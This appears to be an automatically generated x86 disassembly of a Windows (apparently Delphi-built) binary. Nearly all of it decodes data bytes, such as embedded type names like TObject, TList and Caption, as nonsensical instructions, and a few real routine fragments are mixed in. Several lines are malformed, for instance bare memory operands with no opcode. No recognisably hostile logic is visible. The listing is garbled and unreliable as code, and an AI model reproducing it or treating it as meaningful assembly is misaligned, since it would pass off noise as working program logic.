or [ edi + 0x6f ] dl
jb r-xdata
push 0x61430601
jns r-xdata
je r-xdata
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
jns r-xdata
popad
add al [ esi + ecx * 2 ]
push esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
js r-xdata
outsd
outsb
jae r-xdata
or cl [ eax ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
add [ eax ] cl
sbb edx [ esp + eax * 2 + 0x69 ]
jae r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax ] dl
add [ edi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push es
je r-xdata
dec ecx
je r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
inc ecx
push ebx
outsb
push edx
jo r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
inc esi
outsd
jb r-xdata
insd
inc ecx
push ebx
outsb
jb r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
insd
inc ecx
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
inc ebx
push 0x4e6b6365
popad
insd
jae r-xdata
dec ecx
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax - 0x1 ] bh
inc [ esi ]
or [ edx ] dl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
adc [ eax ] eax
int3
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
or [ ecx + 0x44 ] ecx
inc ecx
push ebx
outsb
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
je r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
add al [ esi + ecx * 2 ]
push esp
dec edi
or cl [ edx ]
inc ecx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
or [ ecx ] ah
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
outsb
inc edx
outsw
jb r-xdata
insd
push edi
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or cl [ edx ]
inc ecx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
push 0x65
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
or [ edi + 0x6f ] dl
jb r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
insd
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
add [ esi ] eax
inc ecx
je r-xdata
or cl [ edx ]
push esp
dec edi
push es
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
add [ fs : edx ] al
or [ edx ] bl
push esp
inc esp
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
rol [ ecx ] 0x1
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax ] dl
inc edi
add [ eax ] bh
add al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
outsd
outsd
insb
add [ ecx + edx - 0x10ebffc0 ] al
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
aam 0x0
add [ eax ] al
and al 0xe7
inc esi
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
je r-xdata
inc ecx
je r-xdata
push ebx
inc ecx
je r-xdata
insd
dec ecx
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add al cl
jmp r-xdata
inc edx
add [ esi ] eax
inc ecx
je r-xdata
popad
jbe r-xdata
add [ 0x73694454 ] cl
je r-xdata
add [ esi ] ah
add al [ edi ]
inc edx
outsw
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
inc edx
outsw
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
inc esi
add ah cl
adc [ eax ] al
nop
sub [ ecx ] al
inc edi
add [ eax ] cl
sbb [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
adc [ eax ] eax
adc al 0xef
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add al [ es : edi ]
inc esp
insb
adc [ eax ] eax
int3
je r-xdata
add ecx [ eax ]
pop es
je r-xdata
add [ ebx ] al
or [ edi ] al
inc esi
add [ eax + r-xdata ] dl
or [ ebx ] bl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
outsd
outsd
inc edx
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
outsb
dec edi
jo r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
cmp [ edx ] al
inc edi
add [ edi ] al
or eax 0x73694454
je r-xdata
inc esi
add [ eax + 0x8004700 ] bh
and [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
inc ecx
push ebx
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
or al [ ecx + ecx * 2 ]
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
dec ecx
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
push es
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
or [ edi + 0x6e ] ecx
outsb
test al 0xfc
inc esi
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0006 ] al
outsb
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ esi ] cl
dec edi
imul esi [ ebx + 0x74 ] 0x6d657449
rol [ ecx ] 0x1
inc edi
add ah dl
out 0x46 eax
add [ 0x754f0900 ] dl
je r-xdata
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x3fffb8f2 ] ah
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
pushfd
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
insd
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
pop es
popad
jb r-xdata
add [ eax ] al
or [ ecx ] 0x0
je r-xdata
dec edi
outsd
outsd
imul ebx [ eax + 0x50 ] 0x10
add [ esp + edi * 8 + 0x46 ] ah
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120010 ] al
outsb
inc edx
outsw
jb r-xdata
jns r-xdata
or [ ebx ] 0x0
push es
dec edi
fdivr st5
inc esi
add [ eax ] dh
add bh bh
jo r-xdata
dec edi
add [ edi ] al
and dh bh
inc esi
add [ eax ] bh
add bh bh
js r-xdata
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f070009 ] al
outsb
inc ebx
jne r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and al 0xfd
inc esi
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f160007 ] al
outsb
je r-xdata
add bh bh
rol [ eax ] 0x0
inc ebx
push 0x4e6b6365
outsb
push edx
popad
jo r-xdata
add [ eax ] al
inc [ esi ]
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000d ] al
jo r-xdata
outsb
inc esi
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000c ] al
pop es
dec edi
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
jns r-xdata
jo r-xdata
adc [ edi + 0x6e ] cl
insd
push eax
jb r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ed48
lea eax [ ebx + 0x9c ]
mov edx [ ebp - 0x4 ]
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0011 ] al
outsb
inc ecx
je r-xdata
add [ edi ] al
mov al 0x0
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
cmovg ebp [ esi + 0x41 ]
popad
insd
jae r-xdata
arpl [ gs : ebx + 0x4e ] bp
jb r-xdata
insb
insb
xor bh bh
inc esi
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
outsb
push edx
jo r-xdata
add [ edx ] cl
dec edi
jb r-xdata
jb r-xdata
jo r-xdata
mov ecx r-xdata
call sub_405a10
sbb [ eax + eax + 0x558b0000 ] 0xfffffffc
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
push cs
dec edi
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
adc [ edi + 0x6e ] cl
je r-xdata
inc [ esi ]
mov al [ 0xffffffffa0ff0000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000f ] al
outsb
push edi
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000e ] al
outsb
push ebx
outsb
je r-xdata
add [ eax ] al
[ eax + 0x1ff0000 ]
jns r-xdata
add [ eax + 0x4f10000a ] al
jb r-xdata
add [ eax ] al
popad
jbe r-xdata
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
inc esp
insb
je r-xdata
add [ eax + 0x4f160013 ] al
outsb
inc edx
outsw
jb r-xdata
add [ eax ] al
inc ecx
je r-xdata
pushad
add [ edi ] al
mov eax 0xb8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100012 ] al
outsb
jne r-xdata
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x9c ] 0x0
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
mov esp 0xa80046ff
add [ eax ] al
[ eax + 0x1ff0000 ]
push edx
jo r-xdata
push 0x65676e61
dec esp
jns r-xdata
popad
outsb
dec esp
jns r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
lea edx [ ebp - 0x4 ]
mov [ fs : eax ] edx
push sub_47053f
call 0xffffffff83d50510
pushfd
add [ eax ] al
add [ ebx + 0x44b9fc55 ] cl
add eax 0xeee80047
push esp
stc
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
outsb
inc edx
and al 0x1
inc edi
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0014 ] al
stc
inc ebx
jmp sub_4039a0
mov edx rw-data
mov [ eax + 0x30 ] edx
retn
outsw
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
popad
mov ah 0x0
inc edi
add al al
add [ eax ] al
inc eax
add [ eax ] al
add [ eax + 0x4f06000b ] al
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push 0x65676e61
js r-xdata
js r-xdata
inc esi
outsd
jb r-xdata
inc esi
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090008 ] al
outsb
sub_46f20b
add [ esi + eax ] dl
inc edi
add ah bl
add al 0x47
add [ ebp + eax + 0x47 ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + ebp * 8 + 0x46 ] dh
add [ eax + eax + 0x54130000 ] bl
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0006 ] al
outsb
dec ecx
je r-xdata
insb
outsd
outsd
imul eax [ ecx + 0x70 ] 0x70
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
mov eax eax
inc esp
inc esi
add [ edi ] al
adc edx [ edi + ecx * 2 + 0x75 ]
je r-xdata
or [ ecx ] 0x0
adc [ edi + 0x6e ] ecx
insd
push ebx
outsb
dec esp
jns r-xdata
dec esp
outsd
outsd
imul eax [ ecx + 0x70 ] 0x70
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
aam 0xf1
inc esi
add ah dl
out 0x46 eax
add [ edi ] cl
add [ ecx ] cl
dec edi
jne r-xdata
push ebx
popad
jb r-xdata
imul ebp [ edi + 0x6e ] 0x67615073
jae r-xdata
dec edi
jo r-xdata
imul ebp [ esi + 0x64 ] 0xf06c7265
inc esi
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f110009 ] al
outsb
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090007 ] al
outsb
dec esi
ja r-xdata
sbb al 0xf0
inc esi
add [ eax ] ah
insb
outsd
outsd
imul ebx [ eax + 0x50 ] 0xa
add [ eax ] al
adc [ eax ] al
cwde
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41080005 ] al
jne r-xdata
insd
jo r-xdata
push 0x706d6f43
insb
je r-xdata
dec edi
outsb
push ecx
jne r-xdata
dec esp
jns r-xdata
popad
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0008 ] al
outsb
push edx
insd
popad
imul ebp [ esp + ebx - 0x10 ] 0x600046
outsd
push ecx
jne r-xdata
outsb
je r-xdata
adc [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
sub cl dh
inc esi
add [ eax - 0x77010000 ] cl
add [ eax - 0x6f010000 ] dl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f13000e ] al
outsb
dec ebp
inc ecx
push eax
dec ecx
dec esp
outsd
outsd
outsb
inc ebx
outsd
je r-xdata
add [ eax ] dh
add bh bh
jo r-xdata
insd
je r-xdata
or al [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
or cl [ eax ]
push edx
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x6 ] si
jb r-xdata
pop es
inc ecx
push ebx
outsb
or ah dh
inc esi
add [ eax ] cl
pop es
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
dec edi
jo r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsb
arpl [ ebp + 0x64 ] sp
push ebx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edi + 0x6e ] ecx
push ebx
je r-xdata
add bh bh
add [ eax ] eax
out dx eax
inc esi
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
outsd
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] 0x69444909
jae r-xdata
outsb
push 0x61430601
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax + r-xdata ] dl
or [ eax ] bl
push esp
inc ebx
outsd
outsb
je r-xdata
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push 0x706f7453
jo r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f17000d ] al
jb r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
nop
sbb al 0xf5
inc esi
add [ eax ] cl
adc edx [ ebx + eax * 2 + 0x6f ]
arpl [ gs : edx + eax + 0x4 ] si
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
dec esi
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
popad
je r-xdata
inc ebx
popad
add [ esi ] eax
outsb
je r-xdata
adc [ eax ] eax
add [ ecx ] dl
inc eax
add [ eax + r-xdata ] dl
or [ ebx ] dl
push esp
inc ebx
outsd
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah dl
adc [ eax ] eax
int3
aam 0x11
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
inc ebx
jne r-xdata
dec esp
jns r-xdata
jbe r-xdata
jne r-xdata
jb r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
je r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
pop es
push 0x6552080a
jae r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
inc ebx
jne r-xdata
je r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
outsb
inc ecx
dec esp
jns r-xdata
add al [ esi + ecx * 2 ]
popad
insd
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
dec esi
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsd
je r-xdata
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
popad
jb r-xdata
popad
add al [ esi + ecx * 2 ]
push esp
or [ fs : ecx + 0x44 ] ecx
je r-xdata
je r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax + ecx ] al
add [ eax ] bh
add bh bh
js r-xdata
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
lea eax [ eax ]
adc dh dh
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6f ] edx
add [ esi ] eax
inc ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
push edx
jae r-xdata
jb r-xdata
je r-xdata
inc ebx
insb
outsd
jae r-xdata
insd
outsb
je r-xdata
inc ebx
outsd
inc edx
outsd
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
push eax
jb r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
popad
jb r-xdata
insd
push eax
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
je r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
push edx
jo r-xdata
insd
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
popad
outsd
outsb
jae r-xdata
push 0x61430601
jns r-xdata
add al 0x4e
outsb
jb r-xdata
or al [ edi ]
inc esi
outsd
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x7 ] si
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
jo r-xdata
inc eax
add ah cl
adc [ eax ] al
lea eax [ eax ]
jl r-xdata
inc esi
add [ eax ] cl
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add al al
cmc
inc esi
add [ eax ] cl
imul esi [ ebx + 0x70 ] 0x68637461
or [ ecx + 0x44 ] ecx
dec ecx
inc esp
jo r-xdata
imul esi [ ebp ] 0x41070802
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
jns r-xdata
dec ecx
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
popad
je r-xdata
test [ ecx ] dl
inc eax
add ah dl
adc [ eax ] eax
int3
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
insb
test [ esi ] 0x8
adc al 0x54
dec ecx
je r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
or cl [ eax ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
sbb dl [ ebx + eax * 2 + 0x6f ]
outsb
je r-xdata
jb r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
or [ edi + 0x6f ] dl
jb r-xdata
insd
push ebx
outsb
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
inc edx
outsw
jb r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax + r-xdata ] dl
or [ ecx ] dl
push esp
inc ebx
outsd
inc eax
add ah cl
adc [ eax ] al
nop
int3
insb
insb
outsb
je r-xdata
nop
adc bh dh
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6f ] edx
outsd
outsb
jae r-xdata
add ecx [ eax ]
pop es
inc ecx
push ebx
arpl [ gs : ecx + eax + 0x6 ] si
insd
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push 0x61430601
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
push edx
jo r-xdata
insd
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
jns r-xdata
inc ebx
outsd
outsb
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ edi + esi * 8 + 0x46 ] dl
add [ eax ] cl
sbb al 0x54
inc ebx
outsd
outsb
je r-xdata
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
add [ esi ] eax
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
inc ebx
push 0x4e6b6365
popad
insd
jae r-xdata
outsb
push edi
jb r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
push edx
jae r-xdata
or cl [ eax ]
adc [ eax ] eax
int3
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
inc esi
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax + r-xdata ] dl
or [ ecx ] bl
push esp
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
je r-xdata
insd
inc esi
outsd
jb r-xdata
inc ecx
push ebx
outsb
jb r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
outsb
je r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
inc ecx
je r-xdata
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
add [ eax ] cl
and [ ebx + eax * 2 + 0x6f ] dl
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
inc ebx
add [ esi ] eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
je r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
inc ecx
je r-xdata
popad
outsb
push ebx
outsb
jb r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
inc ecx
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
inc ecx
je r-xdata
or cl [ edx ]
push esp
dec edi
add [ ebx + 0x46f8bcc0 ] cl
add [ eax ] cl
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
add [ eax ] cl
sbb dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
add ecx [ eax ]
pop es
push 0x65
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
push esp
inc ebx
outsd
popad
jbe r-xdata
or cl [ edx ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
or [ edi + 0x6f ] dl
jb r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
je r-xdata
stc
inc esi
add ah cl
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
je r-xdata
inc ecx
dec ecx
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
or al [ ecx + ecx * 2 ]
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
dec ecx
push es
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
je r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
stc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
nop
stc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb907 ] ch
sbb [ ebx + eax * 2 + 0x6f ] dl
inc edx
outsd
outsd
insb
add [ ecx + edx - 0x10ebffc0 ] al
outsb
je r-xdata
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
add [ esp + edx * 2 ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ edx - 0x2bffb907 ] bh
inc esp
insb
